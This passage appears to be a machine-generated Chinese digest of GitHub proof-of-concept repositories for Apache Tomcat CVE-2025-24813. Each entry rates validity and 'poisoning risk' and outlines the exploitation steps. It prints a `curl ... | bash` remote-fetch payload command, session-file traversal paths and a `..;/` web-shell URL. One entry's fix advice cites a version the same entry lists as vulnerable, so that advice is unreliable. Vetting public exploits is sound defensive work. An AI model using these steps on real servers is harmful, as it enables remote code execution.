2.  **远程代码执行：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   应用程序使用 Tomcat 的文件会话保持机制，且为默认存储位置。
    *   应用程序包含一个可以被用于反序列化攻击的库。
    攻击者可以利用路径等价漏洞将恶意序列化数据写入到会话文件中，并触发反序列化漏洞，从而执行任意代码。

**总结：**
CVE-2025-24813 是一个高危漏洞，需要尽快进行修复。在修复之前，应该禁用 Default Servlet 的写入功能，并限制 partial PUT 请求的使用。同时，应该对 Maven Wrapper 脚本进行安全审计，确保其指向的 Maven 发行版是可信的。

**项目地址:** [n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813](https://github.com/n0n-zer0/Spring-Boot-Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #42

**来源**: [CVE-2025-24813-naikordian_CVE-2025-24813.md](../2025/CVE-2025-24813-naikordian_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，敏感信息泄露以及文件被恶意篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** RCE：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. application was using Tomcat's file based session persistence with the default storage location; 4. application included a library that may be leveraged in a deserialization attack.
信息泄露/文件篡改：1. writes enabled for the default servlet (disabled by default); 2. support for partial PUT (enabled by default); 3. a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads; 4. attacker knowledge of the names of security sensitive files being uploaded; 5. the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等效漏洞，利用 'file.Name' (内部点) 导致远程代码执行 (RCE) 和/或信息泄露和/或通过在 Apache Tomcat 中启用写入的默认 Servlet 将恶意内容添加到上传的文件中。

**有效性：** 根据搜索引擎结果以及漏洞库信息，该漏洞存在PoC，并且已经被利用，因此判断PoC有效。

**投毒风险：** 提供的漏洞利用代码只包含一个`README.md`文件，仅包含 CVE-2025-24813 的名称信息，无法进行漏洞利用。但根据其他的搜索结果，已经存在公开可用的PoC，因此投毒风险较低，但也存在被替换成恶意PoC的可能，估计投毒风险为10%。

**利用方式：**

1.  **信息泄露/文件篡改：**
    *   首先，需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   存在一个安全敏感文件上传的目标 URL，该 URL 是公共文件上传目标 URL 的子目录。
    *   攻击者需要知道安全敏感文件的名称。
    *   安全敏感文件通过 partial PUT 进行上传。
    *   利用路径等效（'file.Name' 中的内部点）来访问和修改安全敏感文件。

2.  **远程代码执行 (RCE)：**
    *   需要启用 Default Servlet 的写入功能（默认禁用）。
    *   Tomcat 必须支持 partial PUT（默认启用）。
    *   应用需要使用 Tomcat 基于文件的会话持久性，并使用默认存储位置。
    *   应用程序需要包含一个可用于反序列化攻击的库。
    *   通过上传包含恶意序列化数据的会话文件，实现远程代码执行。

**项目地址:** [naikordian/CVE-2025-24813](https://github.com/naikordian/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #43

**来源**: [CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md](../2025/CVE-2025-24813-ps-interactive_lab-cve-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 1. 默认Servlet启用写入 (默认禁用)
2. 支持部分PUT (默认启用)
3. 对于信息泄露/文件注入：目标URL是公共上传目标URL的子目录；攻击者知道安全敏感文件的名称；安全敏感文件也通过部分PUT上传。
4. 对于RCE：应用程序使用Tomcat基于文件的会话持久性与默认存储位置；应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它允许攻击者通过路径等价（'file.Name' 中的内部点）导致远程代码执行（RCE）或信息泄露，或通过启用了写入的 Default Servlet 向上传的文件中添加恶意内容。 根据漏洞库信息，该漏洞存在两种利用场景：

**信息泄露/文件注入：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   目标 URL 是公共上传目标 URL 的子目录。
*   攻击者知道安全敏感文件的名称。
*   安全敏感文件也通过部分 PUT 上传。

**远程代码执行：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   应用程序使用 Tomcat 基于文件的会话持久性与默认存储位置。
*   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析：**

提供的 Dockerfile 修改了 Tomcat 的 `web.xml` 和 `context.xml` 文件，启用了 Default Servlet 的写入功能，并配置了基于文件的会话持久性。这满足了漏洞利用的先决条件。

POC代码尝试利用文件上传漏洞，如果成功，可以向Tomcat服务器写入恶意文件，并利用反序列化漏洞执行任意命令。

**利用方式：**

1.  **检查Default Servlet是否可写:** POC首先尝试通过PUT请求写入文件来检查Default Servlet是否可写。
2.  **生成Payload:** 如果Default Servlet可写，POC会生成恶意payload，可以是一个简单的Java WebShell或更复杂的ysoserial payload。
3.  **上传和验证Payload:** POC通过分块PUT请求将payload上传到Tomcat服务器，并尝试访问上传的文件，以验证payload是否成功执行。
4.  **反序列化攻击(RCE):**  如果Tomcat配置满足反序列化攻击的条件，那么攻击者可以通过上传精心构造的序列化对象，利用存在漏洞的库执行任意代码。

**投毒风险：**

此仓库的投毒风险较低。Dockerfile 仅用于配置 Tomcat 以暴露漏洞，python脚本用于漏洞验证和利用，目的是远程命令执行。 唯一潜在的投毒风险在于：

*   `cve-2025-24813-poc.py`  下载的`ysoserial` 可能包含恶意gadget，但此风险可以通过检查下载源和ysoserial的hash值来降低。

**有效性：**

根据漏洞信息和POC代码，该漏洞利用是有效的，如果目标环境满足先决条件，可以实现RCE或信息泄露。


**项目地址:** [ps-interactive/lab-cve-2025-24813](https://github.com/ps-interactive/lab-cve-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #44

**来源**: [CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md](../2025/CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet的写入已启用（默认禁用），启用partial PUT，应用程序使用Tomcat基于文件的会话持久化，应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，利用 `file.Name` (内部点) 导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。漏洞存在于默认Servlet的写入功能启用时。

**有效性分析：**

提供的 Python 脚本 (CVE-2025-24813.py) 尝试利用此漏洞。脚本包含以下关键步骤：

1.  **检查可写Servlet：** `check_writable_servlet` 函数检查目标 URL 是否可通过 PUT 方法写入。
2.  **生成 Payload：** 脚本可以生成 ysoserial payload 或 Java payload。ysoserial payload 使用指定的 gadget 来执行命令。Java payload 将命令编译成 .class 文件并打包到 JAR 文件中。
3.  **上传 Payload：** `upload_and_verify_payload` 函数尝试将生成的 payload 上传到 `target_url/uploads/../sessions/{session_id}.session`。如果上传成功并返回 409 冲突，则脚本尝试发送一个带有伪造的JSESSIONID cookie的 GET 请求，并期望获得 500 内部服务器错误，这表明漏洞利用可能成功。

**投毒风险分析：**

该脚本存在少量投毒风险，风险点在于:
*   `generate_ysoserial_payload` 函数允许指定 `ysoserial_path` 和 `gadget`。虽然脚本本身没有植入恶意代码，但如果用户使用了被篡改的 ysoserial.jar 或选择了恶意的 gadget，则可能执行任意代码。用户需要自行验证 ysoserial 的来源和完整性。
* `remove_file` 函数尝试删除临时文件，如果由于权限或其他原因失败，可能会留下编译后的 Java 类文件。
总体代码逻辑是尝试复现和利用漏洞，未发现明显恶意代码。因此，投毒风险较低。

**利用方式：**

1.  **前提条件：** 确保目标 Tomcat 服务器满足漏洞利用的条件，特别是启用了默认 Servlet 的写入功能和 partial PUT。
2.  **确定目标 URL 和会话 ID：** 找到 Tomcat 服务器的 uploads 目录和目标应用程序使用的会话 ID。session id可以从服务器获取，或者脚本中指定，上传的session文件名由此决定。
3.  **生成 Payload：** 使用脚本提供的 `generate_ysoserial_payload` 或 `generate_java_payload` 函数生成包含恶意命令的 payload。
4.  **上传 Payload：** 使用 `upload_and_verify_payload` 函数将生成的 payload 上传到 Tomcat 服务器的会话目录。
5.  **触发反序列化：** 脚本通过发送带有特定 Cookie 的 GET 请求来触发反序列化。如果一切顺利，服务器将执行 payload 中的恶意命令。

**项目地址:** [sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC](https://github.com/sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #45

**来源**: [CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md](../2025/CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入 (默认关闭), 支持Partial PUT (默认开启), 目标URL存在子目录关系, 攻击者已知敏感文件名 (信息泄露); 或 使用了 Tomcat 的文件Session持久化 (默认位置), 存在可被利用的反序列化库 (RCE)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 中，是一个路径等价漏洞，结合部分PUT请求功能，可能导致远程代码执行、信息泄露或文件内容被恶意篡改。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的PoC代码，可以判断该PoC代码具有一定的有效性。搜索结果表明，该漏洞已被积极利用，并且存在公开可用的利用方法。PoC代码利用了 Tomcat 的 partial PUT 功能，结合路径遍历，将恶意payload上传到session目录，通过触发反序列化漏洞来实现远程代码执行。

**投毒风险分析：**

PoC代码中存在一定的投毒风险，风险比例约为5%。具体分析如下：

*   PoC代码首先尝试从多个URL下载ysoserial.jar，如果本地不存在。虽然这些URL都是公开的maven仓库或者github地址，但仍然存在被替换为恶意jar包的风险。 *   PoC代码在generate_payload函数中，使用了`subprocess.check_output`来执行java命令，生成payload。如果攻击者能够控制命令行的参数，就可以执行任意命令，进行投毒。
*   PoC代码在try_targets函数中, 尝试通过IP地址解析域名, 并以此进行攻击,可能会对目标网络造成干扰。

尽管存在上述风险，但主要功能符合漏洞利用逻辑，因此判断投毒风险较低。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 实例需要满足以下条件：
    *   Default Servlet 开启了写入功能（默认是关闭的，需要手动配置）。
    *   支持 Partial PUT（默认开启）。
    *   对于RCE，需要使用Tomcat的文件Session持久化机制，并且依赖中存在可被利用的反序列化库。
2.  **下载ysoserial：** PoC 首先会尝试下载 ysoserial.jar，用于生成反序列化 payload。
3.  **判断是否可写：** PoC 尝试在目标服务器上创建一个临时文件，以判断 Default Servlet 是否允许写入。
4.  **生成 Payload：** 使用 ysoserial，根据指定的 gadget 和命令，生成 Java 反序列化 payload。该命令默认使用`curl -fsSL {shell_url} | bash`从指定的`shell_url`下载shell脚本并执行，达到远程代码执行的目的。
5.  **上传 Payload：** 使用 partial PUT 方法，将生成的 payload 上传到 Tomcat session 存储目录。利用路径遍历漏洞，可以绕过一些安全限制。上传的文件名为 `{session_id}.session`。
6.  **触发 Payload：** 通过发送带有特定 Session ID 的 HTTP 请求，触发反序列化操作，从而执行恶意代码。

**总结：**

该漏洞的利用涉及多个步骤，需要目标环境满足一定的条件。PoC 代码通过利用 partial PUT 和路径遍历漏洞，结合 ysoserial 生成的 payload，最终实现远程代码执行。尽管存在一定的投毒风险，但总体来说，该 PoC 代码能够有效地利用 CVE-2025-24813 漏洞。

**项目地址:** [thebringerofdeath789/CVE-2025-24813](https://github.com/thebringerofdeath789/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #46

**来源**: [CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md](../2025/CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价性漏洞/远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1-9.0.98, 10.1.0-M1-10.1.34, 11.0.0-M1-11.0.2

**利用条件:** 需要满足以下条件：默认Servlet的写入已启用（默认禁用）、支持部分PUT（默认启用）、应用程序使用Tomcat基于文件的会话持久性，默认存储位置、应用程序包含可在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞，源于对包含特殊字符（特别是分号“;”）的 URL 的解析不一致。这种不一致允许攻击者构造恶意 URL，该 URL 被安全检查组件和文件服务组件以不同的方式解释。如果启用了`default` servlet 的写权限和启用了`partial PUT`，并且使用了存在反序列化漏洞的依赖， 攻击者可以通过上传恶意文件（例如，JSP webshell），然后利用构造的包含 `..;/` 的 URL 来绕过安全限制，最终在服务器上实现远程代码执行(RCE)。

**有效性评估：**

根据漏洞描述和搜索结果，此漏洞已在野外被积极利用。漏洞利用代码中的 `README.md` 文件详细描述了漏洞原理、攻击链和利用方式，表明该 PoC 代码具备一定的有效性。

**投毒风险评估：**

分析了漏洞利用代码目录下的 `LICENSE` 和 `README.md` 文件，未发现明显的恶意代码。但任何 PoC 代码都存在潜在风险，不应在生产环境直接运行。 无法保证作者没有在其他文件中添加隐藏的后门代码。因此, 投毒风险评估为10%。

**漏洞利用方式：**

1.  **上传恶意 Payload：** 攻击者通过 Web 应用程序的文件上传功能，将恶意的 JSP Web Shell（例如 `shell.jsp`）上传到已知的非可执行目录，例如 `/uploads`。
2.  **发现Endpoint：** 攻击者识别服务器上一个合法的，可执行的 JSP 端点，例如 `/user/profile.jsp`。
3.  **构造和执行攻击URL：** 攻击者构造最终 URL，其中包含 `..;/` 序列来绕过安全检查。例如：`/app/user/..;/uploads/shell.jsp`。当服务器接收到此请求时，安全管理器可能只检查 `/app/user/` 的权限，而文件系统解析器会处理 `../` 并执行 `/uploads/shell.jsp` 中的代码。

**修复建议：**

*   升级到 Apache Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
*   禁用 default servlet 的写权限，除非绝对必要。
*   审查并更新应用程序依赖，移除存在反序列化漏洞的库。

**项目地址:** [threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat](https://github.com/threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #47

**来源**: [CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：1. writes enabled for the default servlet (默认禁用); 2. 支持 partial PUT (默认启用); 3. 使用 Tomcat 的 file based session persistence 和默认存储位置; 4. 应用包含一个可能被用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 远程代码执行漏洞，利用了 Tomcat 处理部分 PUT 请求的方式。攻击者可以通过上传恶意构造的文件（利用 Ysoserial 生成反序列化 payload）到 Tomcat 服务器，然后通过 GET 请求触发反序列化，从而执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索引擎结果（Rapid7, GreyNoise, socprime 等）以及提供的 POC 代码，可以判断该漏洞是有效的，并且已经被观察到在野利用。POC 代码通过生成多种 Ysoserial payload 并尝试上传，增加了漏洞利用成功的概率。

**投毒风险分析：**

分析提供的 POC 代码，发现其主要功能是利用 ysoserial 生成反序列化 payload，然后通过 PUT 和 GET 请求触发漏洞。代码本身没有明显的恶意行为，例如向其他服务器发送信息或篡改本地文件。主要风险在于使用未经验证的第三方库（ysoserial），这本身可能存在安全风险，但是这是漏洞利用本身的一部分，而不是作者额外添加的恶意代码。

评估投毒风险较低，约为5%。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 服务器需要满足特定配置条件，包括开启了 default servlet 的写入权限，支持 partial PUT，并且应用使用了 Tomcat 的文件会话持久化功能，且包含可被利用的反序列化库。
2.  **生成 Payload：** 使用 ysoserial 工具生成包含恶意命令的反序列化 payload。POC 代码支持批量生成不同 gadget chain 的 payload，提高成功率。
3.  **PUT 请求：** 通过 PUT 请求，将生成的 payload 分段上传到目标 Tomcat 服务器。利用 Content-Range 头部模拟 partial PUT 请求。
4.  **GET 请求：** 通过 GET 请求，触发 Tomcat 对上传文件的反序列化操作，从而执行恶意代码。
5.  **执行命令：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意命令。

**项目地址:** [tonyarris/CVE-2025-24813-PoC](https://github.com/tonyarris/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #48

**来源**: [CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md](../2025/CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入(disabled by default), 支持partial PUT(enabled by default), application 使用了Tomcat基于文件的session持久化，使用了默认的存储位置，并且application包含可被反序列化攻击利用的library。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，可能导致远程代码执行和/或信息泄露。该漏洞的根源在于对文件名的处理方式，特别是内部点（'file.Name'）。

**漏洞利用方式分析：**

根据漏洞库信息和搜索结果，该漏洞存在两种利用方式：

1.  **信息泄露/恶意内容注入：** 如果满足以下条件，攻击者能够查看敏感文件或注入恶意内容：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   目标URL是公共上传URL的子目录。
    *   攻击者知道敏感文件名。
    *   使用 partial PUT 上传敏感文件。

2.  **远程代码执行（RCE）：** 如果满足以下条件，攻击者能够执行任意代码：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   应用程序使用Tomcat的基于文件的session持久化，并使用默认存储位置。
    *   应用程序包含一个可以用于反序列化攻击的library。

**POC 代码分析：**

POC代码`CVE_2025_24813.py`实现了以下功能：

1.  **检查Servlet是否可写：** 使用PUT请求向目标URL上传文件，检查HTTP响应状态码，以确定服务器是否允许写入。
2.  **生成ysoserial payload：** 使用ysoserial工具生成反序列化payload，需要指定命令、ysoserial路径和gadget。
3.  **生成Java payload：**  生成一个简单的java文件, 然后通过javac编译为class文件, 再打包为jar文件。
4.  **上传和验证payload：** 上传生成的payload到Tomcat服务器, 利用路径穿越漏洞，覆盖session文件，从而执行代码。

**有效性评估：**

根据搜索结果，CVE-2025-24813漏洞正在被积极利用。POC代码涵盖了漏洞利用的关键步骤，包括写入性验证、payload生成和上传，因此可以认为是有效的，但利用成功与否取决于目标环境是否满足利用条件。

**投毒风险评估：**

通过分析POC代码，发现存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖外部工具ysoserial：**  POC代码依赖于ysoserial工具生成反序列化payload。虽然ysoserial是一个常用的漏洞利用工具，但如果用户下载了被篡改的ysoserial版本，可能会执行恶意代码。虽然POC本身没有直接植入恶意代码，但依赖的外部资源存在被投毒的风险。
2.  **执行任意命令：**  该脚本允许执行任意命令。如果攻击者控制了用户运行脚本的环境，可以修改脚本，执行恶意的系统命令，从而控制目标系统。

综合考虑，该POC代码的投毒风险较低，约为5%。大部分代码是用于漏洞利用，风险主要来源于对外部依赖的信任和对执行环境的控制。


**项目地址:** [u238/Tomcat-CVE_2025_24813](https://github.com/u238/Tomcat-CVE_2025_24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #49

**来源**: [CVE-2025-24813-uzairhaider502_CVE-2025-24813.md](../2025/CVE-2025-24813-uzairhaider502_CVE-2025-24813.md)

# CVE-2025-24813

> 📦 该CVE有 **52** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-24813-137f_Poc-CVE-2025-24813.md](../2025/CVE-2025-24813-137f_Poc-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 开启Partial PUT (默认开启), 应用使用基于文件的session持久化(默认位置), 应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，利用了路径等价性（内部点，例如 `file.Name`）结合启用了写入功能的默认 Servlet 和 Partial PUT 功能。该漏洞可能导致远程代码执行（RCE）、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用方式:**

1.  **前提条件:** 漏洞利用需要满足以下条件：
    *   默认 Servlet 开启写入 (disabled by default).
    *   支持 Partial PUT (enabled by default).
    *   对于RCE，应用需要使用 Tomcat 基于文件的 session 持久化，并且包含一个可以被反序列化攻击利用的库（例如，存在于classpath中的commons-collections）。
    *   对于信息泄露/文件篡改，需要攻击者了解敏感文件的上传目标 URL 位于公共上传目标 URL 的子目录下，且攻击者需要知道上传的敏感文件名，且敏感文件通过partial PUT上传。
2.  **漏洞利用步骤:**
    *   **获取 Session ID:** 攻击者首先需要获取一个有效的 JSESSIONID，可以通过访问 `/index.jsp` 获取，如果无法获取则使用默认值。
    *   **测试 PUT 方法:** 攻击者发送一个 PUT 请求来确认目标服务器是否允许使用 `Content-Range` 进行部分写入。
    *   **生成 Payload:**  攻击者使用 `ysoserial` 或者 Java 代码生成一个恶意的序列化对象。`ysoserial` 通过指定的 gadget（例如 `CommonsCollections6`）来执行命令。也可以生成一个包含恶意命令执行的Java .jar文件。
    *   **上传 Payload:**  攻击者利用路径遍历将 payload 上传到 Tomcat 的 session 目录。例如，`/uploads/../sessions/{JSESSIONID}.session`。
    *   **触发执行:**  攻击者使用包含恶意 JSESSIONID 的请求来访问应用程序。Tomcat 将会反序列化该 session 文件，从而执行攻击者注入的命令。

**有效性:**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞的 POC 代码**有效**。搜索结果中提到了该漏洞已被积极利用。提供的 POC 代码包含利用该漏洞进行 RCE 的 Python 脚本，并提供了详细的利用步骤和参数说明。

**投毒风险:**

评估提供的 POC 代码，投毒风险较低，约为 **10%**。主要考虑因素如下：

*   **代码结构:** 代码结构较为清晰，主要分为获取 Session ID、验证 PUT 方法、生成 Payload 和发送 Payload 等几个模块。
*   **依赖项:**  代码依赖 `ysoserial.jar`，这本身是一个已知的漏洞利用工具，如果攻击者替换了 `ysoserial.jar` 文件，则可能引入恶意代码。此外，java payload方式需要服务器具有java编译环境。
*   **潜在风险:**  `java_payload` 函数中使用 `Runtime.getRuntime().exec(c)` 直接执行命令，如果命令字符串 `cmd` 构造不当，可能会存在命令注入的风险。
*   **作者声明:**  README 文件中包含免责声明，说明该代码仅用于教育目的，这在一定程度上降低了作者进行恶意投毒的可能性。

总的来说，虽然代码本身看起来没有明显的恶意行为，但仍然需要谨慎使用，并确保从可信的来源获取 `ysoserial.jar`，并仔细检查命令字符串，避免引入额外的安全风险。 java payload方式需要服务器具有java编译环境,具有一定局限性。

**项目地址:** [137f/Poc-CVE-2025-24813](https://github.com/137f/Poc-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #2

**来源**: [CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露，文件被篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足特定配置条件，包括启用Default Servlet的写入功能，启用partial PUT支持，存在安全敏感文件上传的目标URL位于公共上传目标URL的子目录中，攻击者已知安全敏感文件的名称，以及安全敏感文件通过partial PUT上传。或者，启用Default Servlet的写入功能，启用partial PUT支持，应用程序使用Tomcat基于文件的会话持久性与默认存储位置，应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息，CVE-2025-24813 涉及 Apache Tomcat 的路径等效问题，可能导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。利用条件包括Default Servlet启用了写入，支持partial PUT，以及应用程序的特定配置。搜索引擎结果显示，该漏洞已被公开并被积极利用。

提供的 POC 代码尝试利用该漏洞。它首先使用 `argparse` 处理目标 URL 参数。然后，它包含一段 base64 编码的 payload，该 payload 是一个经过序列化的 Java 对象，旨在执行命令 `touch /tmp/RCE-success`。  该脚本将解码后的payload保存到`decoded_chain.bin`文件中。 然后，使用 `requests.put` 函数，通过构造包含 'Content-Range' 头部的 PUT 请求，利用 Tomcat 的 partial PUT 功能，将payload上传到目标服务器。PUT请求的目标URL是`TARGET_IP/payload.session`。脚本上传完成后删除临时文件。 最后使用Cookie进行getSession。

**有效性评估：** POC 的有效性取决于目标 Tomcat 服务器是否满足漏洞利用的全部条件。如果 Default Servlet 的写入已启用，并且启用了 partial PUT 支持，并且满足其他条件，则 POC 可能有效。

**投毒风险评估：** 仔细检查提供的 POC 代码，没有发现明显的投毒代码。该代码旨在利用已知的 Tomcat 漏洞，而不是在目标系统上植入后门或执行恶意操作。 代码中包含的base64编码的payload部分是最有可能存在风险的部分，但是payload中的命令是`touch /tmp/RCE-success`，该命令仅仅是创建一个文件，用于验证漏洞是否存在，并非恶意操作。

**利用方式总结：**

1.  **条件确认:** 确认目标 Tomcat 服务器启用了 Default Servlet 的写入功能，并启用了 partial PUT 支持，以及是否满足其他相关条件。
2.  **Payload 生成:**  生成一个恶意 Java 序列化对象，该对象可以执行任意代码，或者读取敏感文件。
3.  **Partial PUT 上传:**  使用 HTTP PUT 请求，通过设置 `Content-Range` 头部，将恶意 payload 分块上传到目标服务器上的特定路径（例如，`payload.session`）。
4.  **触发反序列化：**  Tomcat 尝试反序列化上传的文件，从而触发恶意代码的执行。


**项目地址:** [Alaatk/CVE-2025-24813-POC](https://github.com/Alaatk/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #3

**来源**: [CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md](../2025/CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

